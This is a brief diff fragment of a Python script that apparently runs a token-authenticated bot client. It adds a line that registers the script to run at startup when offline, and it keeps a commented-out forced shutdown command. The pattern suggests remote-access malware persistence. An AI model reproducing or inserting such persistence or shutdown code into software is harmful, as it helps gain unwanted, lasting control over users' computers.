@@ -766,6 +766,7 @@ if check_internet():
             client.run(TOKEN)
         except:
             pass
+else: Startup(sys.argv[0])
 
 
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
